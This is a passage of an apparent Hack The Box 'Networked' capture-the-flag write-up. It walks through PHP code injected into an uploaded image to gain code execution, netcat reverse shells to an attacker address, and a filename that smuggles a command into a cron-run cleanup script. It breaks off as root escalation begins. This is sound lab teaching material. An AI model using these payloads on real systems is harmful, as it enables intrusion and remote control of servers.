<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">&lt;style type=<span class="string">"text/css"</span>&gt;</span><br><span class="line">.tg  &#123;border-collapse:collapse;border-spacing:<span class="number">0</span>;margin:<span class="number">0</span>px auto;&#125;</span><br><span class="line">.tg td&#123;font-family:Arial, sans-serif;font-size:<span class="number">14</span>px;padding:<span class="number">10</span>px <span class="number">5</span>px;border-style:solid;border-width:<span class="number">1</span>px;overflow:hidden;word-<span class="keyword">break</span>:normal;border-color:black;&#125;</span><br><span class="line">.tg th&#123;font-family:Arial, sans-serif;font-size:<span class="number">14</span>px;font-weight:normal;padding:<span class="number">10</span>px <span class="number">5</span>px;border-style:solid;border-width:<span class="number">1</span>px;overflow:hidden;word-<span class="keyword">break</span>:normal;border-color:black;&#125;</span><br><span class="line">.tg .tg<span class="number">-0</span>lax&#123;text-align:left;vertical-align:top&#125;</span><br><span class="line">@media screen <span class="keyword">and</span> (max-width: <span class="number">767</span>px) &#123;.tg &#123;width: auto !important;&#125;.tg col &#123;width: auto !important;&#125;.tg-wrap &#123;overflow-x: auto;-webkit-overflow-scrolling: touch;margin: auto <span class="number">0</span>px;&#125;&#125;&lt;/style&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">Welcome to our awesome gallery!&lt;/br&gt;</span><br><span class="line">See recent uploaded pictures from our community, <span class="keyword">and</span> feel free to rate <span class="keyword">or</span> comment&lt;/br&gt;</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">require</span> <span class="string">'/var/www/html/lib.php'</span>;</span><br><span class="line">$path = <span class="string">'/var/www/html/uploads/'</span>;</span><br><span class="line">$ignored = <span class="keyword">array</span>(<span class="string">'.'</span>, <span class="string">'..'</span>, <span class="string">'index.html'</span>);</span><br><span class="line">$files = <span class="keyword">array</span>();</span><br><span class="line"></span><br><span class="line">$i = <span class="number">1</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">'&lt;div class="tg-wrap"&gt;&lt;table class="tg"&gt;'</span>.<span class="string">"\n"</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">foreach</span> (scandir($path) <span class="keyword">as</span> $file) &#123;</span><br><span class="line">  <span class="keyword">if</span> (in_array($file, $ignored)) <span class="keyword">continue</span>;</span><br><span class="line">  $files[$file] = filemtime($path. <span class="string">'/'</span> . $file);</span><br><span class="line">&#125;</span><br><span class="line">arsort($files);</span><br><span class="line">$files = array_keys($files);</span><br><span class="line"></span><br><span class="line"><span class="keyword">foreach</span> ($files <span class="keyword">as</span> $key =&gt; $value) &#123;</span><br><span class="line">  $exploded  = explode(<span class="string">'.'</span>,$value);</span><br><span class="line">  $prefix = str_replace(<span class="string">'_'</span>,<span class="string">'.'</span>,$exploded[<span class="number">0</span>]);</span><br><span class="line">  $check = check_ip($prefix,$value);</span><br><span class="line">  <span class="keyword">if</span> (!($check[<span class="number">0</span>])) &#123;</span><br><span class="line">    <span class="keyword">continue</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="comment">// for HTB, to avoid too many spoilers</span></span><br><span class="line">  <span class="keyword">if</span> ((strpos($exploded[<span class="number">0</span>], <span class="string">'10_10_'</span>) === <span class="number">0</span>) &amp;&amp; (!($prefix === $_SERVER[<span class="string">"REMOTE_ADDR"</span>])) ) &#123;</span><br><span class="line">    <span class="keyword">continue</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ($i == <span class="number">1</span>) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"&lt;tr&gt;\n"</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="string">'&lt;td class="tg-0lax"&gt;'</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"uploaded by $check[1]"</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;img src='uploads/"</span>.$value.<span class="string">"' width=100px&gt;"</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;/td&gt;\n"</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ($i == <span class="number">4</span>) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"&lt;/tr&gt;\n"</span>;</span><br><span class="line">    $i = <span class="number">1</span>;</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    $i++;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> ($i &lt; <span class="number">4</span> &amp;&amp; $i &gt; <span class="number">1</span>) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"&lt;/tr&gt;\n"</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&lt;/table&gt;&lt;/div&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>
<p><code>upload.php</code>:</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">require</span> <span class="string">'/var/www/html/lib.php'</span>;</span><br><span class="line"></span><br><span class="line">define(<span class="string">"UPLOAD_DIR"</span>, <span class="string">"/var/www/html/uploads/"</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>( <span class="keyword">isset</span>($_POST[<span class="string">'submit'</span>]) ) &#123;</span><br><span class="line">  <span class="keyword">if</span> (!<span class="keyword">empty</span>($_FILES[<span class="string">"myFile"</span>])) &#123;</span><br><span class="line">    $myFile = $_FILES[<span class="string">"myFile"</span>];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!(check_file_type($_FILES[<span class="string">"myFile"</span>]) &amp;&amp; filesize($_FILES[<span class="string">'myFile'</span>][<span class="string">'tmp_name'</span>]) &lt; <span class="number">60000</span>)) &#123;</span><br><span class="line">      <span class="keyword">echo</span> <span class="string">'&lt;pre&gt;Invalid image file.&lt;/pre&gt;'</span>;</span><br><span class="line">      displayform();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> ($myFile[<span class="string">"error"</span>] !== UPLOAD_ERR_OK) &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"&lt;p&gt;An error occurred.&lt;/p&gt;"</span>;</span><br><span class="line">        displayform();</span><br><span class="line">        <span class="keyword">exit</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//$name = $_SERVER['REMOTE_ADDR'].'-'. $myFile["name"];</span></span><br><span class="line">    <span class="keyword">list</span> ($foo,$ext) = getnameUpload($myFile[<span class="string">"name"</span>]);</span><br><span class="line">    $validext = <span class="keyword">array</span>(<span class="string">'.jpg'</span>, <span class="string">'.png'</span>, <span class="string">'.gif'</span>, <span class="string">'.jpeg'</span>);</span><br><span class="line">    $valid = <span class="keyword">false</span>;</span><br><span class="line">    <span class="keyword">foreach</span> ($validext <span class="keyword">as</span> $vext) &#123;</span><br><span class="line">      <span class="keyword">if</span> (substr_compare($myFile[<span class="string">"name"</span>], $vext, -strlen($vext)) === <span class="number">0</span>) &#123;</span><br><span class="line">        $valid = <span class="keyword">true</span>;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!($valid)) &#123;</span><br><span class="line">      <span class="keyword">echo</span> <span class="string">"&lt;p&gt;Invalid image file&lt;/p&gt;"</span>;</span><br><span class="line">      displayform();</span><br><span class="line">      <span class="keyword">exit</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    $name = str_replace(<span class="string">'.'</span>,<span class="string">'_'</span>,$_SERVER[<span class="string">'REMOTE_ADDR'</span>]).<span class="string">'.'</span>.$ext;</span><br><span class="line"></span><br><span class="line">    $success = move_uploaded_file($myFile[<span class="string">"tmp_name"</span>], UPLOAD_DIR . $name);</span><br><span class="line">    <span class="keyword">if</span> (!$success) &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"&lt;p&gt;Unable to save file.&lt;/p&gt;"</span>;</span><br><span class="line">        <span class="keyword">exit</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"&lt;p&gt;file uploaded, refresh gallery&lt;/p&gt;"</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// set proper permissions on the new file</span></span><br><span class="line">    chmod(UPLOAD_DIR . $name, <span class="number">0644</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">  displayform();</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p><code>/upload.php</code>:<br><img src="/images/hackthebox/networked/3.png" alt=""></p>
<p><code>/photos.php</code>:<br><img src="/images/hackthebox/networked/4.png" alt=""></p>
<h2 id="RCE-–-gt-Shell-as-apache"><a href="#RCE-–-gt-Shell-as-apache" class="headerlink" title="RCE –&gt; Shell as apache"></a>RCE –&gt; Shell as apache</h2><p>We can use <code>upload.php</code> to upload images then we can view them through <code>photos.php</code> or <code>/uploads/image_name</code>. For some time I tried to bypass the extension filter in <code>upload.php</code> to upload <code>php</code> files but I wasn’t able to bypass it. However I could get <code>RCE</code> by injecting <code>php</code> code in the uploaded images.<br>I got a solid black image and called it <code>original.png</code>, let’s upload it:<br><img src="/images/hackthebox/networked/5.png" alt=""></p>
<p><img src="/images/hackthebox/networked/6.png" alt=""><br><img src="/images/hackthebox/networked/7.png" alt=""><br><img src="/images/hackthebox/networked/8.png" alt=""><br>Now let’s copy that image and inject some <code>php</code> code into the new image:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~&#x2F;Desktop&#x2F;HTB&#x2F;boxes&#x2F;networked# cp original.png .&#x2F;test.png</span><br><span class="line">root@kali:~&#x2F;Desktop&#x2F;HTB&#x2F;boxes&#x2F;networked# echo &#39;&lt;?php&#39; &gt;&gt; test.png</span><br><span class="line">root@kali:~&#x2F;Desktop&#x2F;HTB&#x2F;boxes&#x2F;networked# echo &#39;passthru(&quot;whoami&quot;);&#39; &gt;&gt; test.png</span><br><span class="line">root@kali:~&#x2F;Desktop&#x2F;HTB&#x2F;boxes&#x2F;networked# echo &#39;?&gt;&#39; &gt;&gt; test.png</span><br><span class="line">root@kali:~&#x2F;Desktop&#x2F;HTB&#x2F;boxes&#x2F;networked# mv test.png test.php.png</span><br><span class="line">root@kali:~&#x2F;Desktop&#x2F;HTB&#x2F;boxes&#x2F;networked#</span><br></pre></td></tr></table></figure>
<p>I injected <code>&lt;?php passthru(&quot;whoami&quot;); ?&gt;</code> which should execute <code>whoami</code>, let’s test it:<br><img src="/images/hackthebox/networked/9.png" alt=""></p>
<p><img src="/images/hackthebox/networked/10.png" alt=""><br><img src="/images/hackthebox/networked/11.png" alt=""><br>Now if we view the file from <code>/uploads</code> we won’t get the image, we’ll get the binary data of the image and the result of the executed <code>php</code> code at the end:<br><img src="/images/hackthebox/networked/12.png" alt=""><br><code>whoami</code> got executed successfully and we’re the user <code>apache</code>.<br>I created another one to get a reverse shell:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~&#x2F;Desktop&#x2F;HTB&#x2F;boxes&#x2F;networked# cp original.png .&#x2F;shell.php.png</span><br><span class="line">root@kali:~&#x2F;Desktop&#x2F;HTB&#x2F;boxes&#x2F;networked# echo &#39;&lt;?php&#39; &gt;&gt; .&#x2F;shell.php.png </span><br><span class="line">root@kali:~&#x2F;Desktop&#x2F;HTB&#x2F;boxes&#x2F;networked# echo &#39;passthru(&quot;rm &#x2F;tmp&#x2F;f;mkfifo &#x2F;tmp&#x2F;f;cat &#x2F;tmp&#x2F;f|&#x2F;bin&#x2F;sh -i 2&gt;&amp;1|nc 10.10.xx.xx 1337 &gt;&#x2F;tmp&#x2F;f&quot;);&#39; &gt;&gt; .&#x2F;shell.php.png </span><br><span class="line">root@kali:~&#x2F;Desktop&#x2F;HTB&#x2F;boxes&#x2F;networked# echo &#39;?&gt;&#39; &gt;&gt; .&#x2F;shell.php.png </span><br><span class="line">root@kali:~&#x2F;Desktop&#x2F;HTB&#x2F;boxes&#x2F;networked#</span><br></pre></td></tr></table></figure>
<p>And I got a shell as <code>apache</code>:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~&#x2F;Desktop&#x2F;HTB&#x2F;boxes&#x2F;networked# nc -lvnp 1337</span><br><span class="line">Ncat: Version 7.70 ( https:&#x2F;&#x2F;nmap.org&#x2F;ncat )</span><br><span class="line">Ncat: Listening on :::1337</span><br><span class="line">Ncat: Listening on 0.0.0.0:1337</span><br><span class="line">Ncat: Connection from 10.10.10.146.</span><br><span class="line">Ncat: Connection from 10.10.10.146:55662.</span><br><span class="line">sh: no job control in this shell</span><br><span class="line">sh-4.2$ whoami</span><br><span class="line">whoami</span><br><span class="line">apache</span><br><span class="line">sh-4.2$ id</span><br><span class="line">id</span><br><span class="line">uid&#x3D;48(apache) gid&#x3D;48(apache) groups&#x3D;48(apache)</span><br><span class="line">sh-4.2$ hostname</span><br><span class="line">hostname</span><br><span class="line">networked.htb</span><br><span class="line">sh-4.2$</span><br></pre></td></tr></table></figure>


<h2 id="Command-Injection-in-check-attack-php-–-gt-Shell-as-guly-–-gt-User-Flag"><a href="#Command-Injection-in-check-attack-php-–-gt-Shell-as-guly-–-gt-User-Flag" class="headerlink" title="Command Injection in check_attack.php –&gt; Shell as guly –&gt; User Flag"></a>Command Injection in check_attack.php –&gt; Shell as guly –&gt; User Flag</h2><p>First thing I did after getting a shell was to make it stable:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">sh-4.2$ which python</span><br><span class="line">which python</span><br><span class="line">&#x2F;usr&#x2F;bin&#x2F;python</span><br><span class="line">sh-4.2$ python -c &quot;import pty;pty.spawn(&#39;&#x2F;bin&#x2F;bash&#39;)&quot;</span><br><span class="line">python -c &quot;import pty;pty.spawn(&#39;&#x2F;bin&#x2F;bash&#39;)&quot;</span><br><span class="line">bash-4.2$ ^Z</span><br><span class="line">[1]+  Stopped                 nc -lvnp 1337</span><br><span class="line">root@kali:~&#x2F;Desktop&#x2F;HTB&#x2F;boxes&#x2F;networked# stty raw -echo</span><br><span class="line">root@kali:~&#x2F;Desktop&#x2F;HTB&#x2F;boxes&#x2F;networked# nc -lvnp 1337</span><br><span class="line"></span><br><span class="line">bash-4.2$ export TERM&#x3D;screen</span><br><span class="line">bash-4.2$</span><br></pre></td></tr></table></figure>
<p>Then I started to enumerate the box, there was only one user on the box called <code>guly</code>:<br> <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">bash-4.2$ cd &#x2F;home&#x2F;</span><br><span class="line">bash-4.2$ ls -al</span><br><span class="line">total 0</span><br><span class="line">drwxr-xr-x.  3 root root  18 Jul  2 13:27 .</span><br><span class="line">dr-xr-xr-x. 17 root root 224 Jul  2 13:27 ..</span><br><span class="line">drwxr-xr-x.  2 guly guly 178 Nov 16 00:31 guly</span><br><span class="line">bash-4.2$ cd guly&#x2F;</span><br><span class="line">bash-4.2$ ls -al</span><br><span class="line">total 32</span><br><span class="line">drwxr-xr-x. 2 guly guly  178 Nov 16 00:31 .</span><br><span class="line">drwxr-xr-x. 3 root root   18 Jul  2 13:27 ..</span><br><span class="line">lrwxrwxrwx. 1 root root    9 Jul  2 13:35 .bash_history -&gt; &#x2F;dev&#x2F;null</span><br><span class="line">-rw-r--r--. 1 guly guly   18 Oct 30  2018 .bash_logout</span><br><span class="line">-rw-r--r--. 1 guly guly  193 Oct 30  2018 .bash_profile</span><br><span class="line">-rw-r--r--. 1 guly guly  231 Oct 30  2018 .bashrc</span><br><span class="line">-rw-------  1 guly guly  749 Nov 16 00:31 .viminfo</span><br><span class="line">-r--r--r--. 1 root root  782 Oct 30  2018 check_attack.php</span><br><span class="line">-rw-r--r--  1 root root   44 Oct 30  2018 crontab.guly</span><br><span class="line">-rw-------  1 guly guly 1920 Nov 16 00:27 dead.letter</span><br><span class="line">-r--------. 1 guly guly   33 Oct 30  2018 user.txt</span><br><span class="line">bash-4.2$ cat user.txt </span><br><span class="line">cat: user.txt: Permission denied</span><br><span class="line">bash-4.2$</span><br></pre></td></tr></table></figure><br>We can’t read the flag as <code>apache</code>, but there are some other interesting readable stuff, <code>crontab.guly</code> shows that <code>/home/guly/check_attack.php</code> gets executed as <code>guly</code> every 3 minutes:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">bash-4.2$ cat crontab.guly</span><br><span class="line">*&#x2F;3 * * * * php &#x2F;home&#x2F;guly&#x2F;check_attack.php</span><br><span class="line">bash-4.2$</span><br></pre></td></tr></table></figure>
<p><code>check_attack.php</code>:</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line">bash<span class="number">-4.2</span>$ cat check_attack.php</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">require</span> <span class="string">'/var/www/html/lib.php'</span>;</span><br><span class="line">$path = <span class="string">'/var/www/html/uploads/'</span>;</span><br><span class="line">$logpath = <span class="string">'/tmp/attack.log'</span>;</span><br><span class="line">$to = <span class="string">'guly'</span>;</span><br><span class="line">$msg= <span class="string">''</span>;</span><br><span class="line">$headers = <span class="string">"X-Mailer: check_attack.php\r\n"</span>;</span><br><span class="line"></span><br><span class="line">$files = <span class="keyword">array</span>();</span><br><span class="line">$files = preg_grep(<span class="string">'/^([^.])/'</span>, scandir($path));</span><br><span class="line"></span><br><span class="line"><span class="keyword">foreach</span> ($files <span class="keyword">as</span> $key =&gt; $value) &#123;</span><br><span class="line">        $msg=<span class="string">''</span>;</span><br><span class="line">  <span class="keyword">if</span> ($value == <span class="string">'index.html'</span>) &#123;</span><br><span class="line">        <span class="keyword">continue</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="comment">#echo "-------------\n";</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">#print "check: $value\n";</span></span><br><span class="line">  <span class="keyword">list</span> ($name,$ext) = getnameCheck($value);</span><br><span class="line">  $check = check_ip($name,$value);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (!($check[<span class="number">0</span>])) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"attack!\n"</span>;</span><br><span class="line">    <span class="comment"># <span class="doctag">todo:</span> attach file</span></span><br><span class="line">    file_put_contents($logpath, $msg, FILE_APPEND | LOCK_EX);</span><br><span class="line"></span><br><span class="line">    exec(<span class="string">"rm -f $logpath"</span>);</span><br><span class="line">    exec(<span class="string">"nohup /bin/rm -f $path$value &gt; /dev/null 2&gt;&amp;1 &amp;"</span>);</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"rm -f $path$value\n"</span>;</span><br><span class="line">    mail($to, $msg, $msg, $headers, <span class="string">"-F$value"</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">bash<span class="number">-4.2</span>$</span><br></pre></td></tr></table></figure>
<p>This script checks for files that aren’t supposed to be in the uploads directory and deletes them, the interesting part is how it deletes the files, it appends the file name to the <code>rm</code> command without any filtering which makes it vulnerable to command injection:</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">exec(<span class="string">"nohup /bin/rm -f $path$value &gt; /dev/null 2&gt;&amp;1 &amp;"</span>);</span><br></pre></td></tr></table></figure>
<p><code>$path</code> is the path of the uploads directory:</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$path = <span class="string">'/var/www/html/uploads/'</span>;</span><br></pre></td></tr></table></figure>
<p>And <code>$value</code> is the suspicious file’s name.<br>We can simply go to <code>/var/www/html/uploads</code> and create a file that holds the payload in its name. The name will start with a semicolon <code>;</code> (to inject the new command) then the reverse shell command.</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">bash-4.2$ cd &#x2F;var&#x2F;www&#x2F;html&#x2F;uploads</span><br><span class="line">bash-4.2$ touch &#39;; nc 10.10.xx.xx 1338 -c bash&#39;</span><br><span class="line">bash-4.2$</span><br></pre></td></tr></table></figure>
<p>After some time I got a shell as <code>guly</code>:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~&#x2F;Desktop&#x2F;HTB&#x2F;boxes&#x2F;networked# nc -lvnp 1338</span><br><span class="line">Ncat: Version 7.70 ( https:&#x2F;&#x2F;nmap.org&#x2F;ncat )</span><br><span class="line">Ncat: Listening on :::1338</span><br><span class="line">Ncat: Listening on 0.0.0.0:1338</span><br><span class="line">Ncat: Connection from 10.10.10.146.</span><br><span class="line">Ncat: Connection from 10.10.10.146:60812.</span><br><span class="line">whoami</span><br><span class="line">guly</span><br><span class="line">python -c &quot;import pty;pty.spawn(&#39;&#x2F;bin&#x2F;bash&#39;)&quot;</span><br><span class="line">[guly@networked ~]$ ^Z</span><br><span class="line">[1]+  Stopped                 nc -lvnp 1338</span><br><span class="line">root@kali:~&#x2F;Desktop&#x2F;HTB&#x2F;boxes&#x2F;networked# stty raw -echo </span><br><span class="line">root@kali:~&#x2F;Desktop&#x2F;HTB&#x2F;boxes&#x2F;networked# nc -lvnp 1338</span><br><span class="line"></span><br><span class="line">[guly@networked ~]$ export TERM&#x3D;screen</span><br><span class="line">[guly@networked ~]$ id</span><br><span class="line">uid&#x3D;1000(guly) gid&#x3D;1000(guly) groups&#x3D;1000(guly)</span><br><span class="line">[guly@networked ~]$ ls -al</span><br><span class="line">total 32</span><br><span class="line">drwxr-xr-x. 2 guly guly  178 Nov 16 00:31 .</span><br><span class="line">drwxr-xr-x. 3 root root   18 Jul  2 13:27 ..</span><br><span class="line">lrwxrwxrwx. 1 root root    9 Jul  2 13:35 .bash_history -&gt; &#x2F;dev&#x2F;null</span><br><span class="line">-rw-r--r--. 1 guly guly   18 Oct 30  2018 .bash_logout</span><br><span class="line">-rw-r--r--. 1 guly guly  193 Oct 30  2018 .bash_profile</span><br><span class="line">-rw-r--r--. 1 guly guly  231 Oct 30  2018 .bashrc</span><br><span class="line">-r--r--r--. 1 root root  782 Oct 30  2018 check_attack.php</span><br><span class="line">-rw-r--r--  1 root root   44 Oct 30  2018 crontab.guly</span><br><span class="line">-rw-------  1 guly guly 3072 Nov 16 00:48 dead.letter</span><br><span class="line">-r--------. 1 guly guly   33 Oct 30  2018 user.txt</span><br><span class="line">-rw-------  1 guly guly  749 Nov 16 00:31 .viminfo</span><br><span class="line">[guly@networked ~]$</span><br></pre></td></tr></table></figure>

<p><img src="/images/hackthebox/networked/13.png" alt=""></p>
<p>We owned user.</p>
<h2 id="Command-Injection-in-the-Network-Script-Name-–-gt-Root-Shell-–-gt-Root-Flag"><a href="#Command-Injection-in-the-Network-Script-Name-–-gt-Root-Shell-–-gt-Root-Flag" class="headerlink" title="Command Injection in the Network Script Name –&gt; Root Shell –&gt; Root Flag"></a>Command Injection in the Network Script Name –&gt; Root Shell –&gt; Root Flag</h2><p>As <code>guly</code> I checked <code>sudo -l</code> and found that <code>guly</code> can run <code>/usr/local/sbin/changename.sh</code> as root without a password: </p>
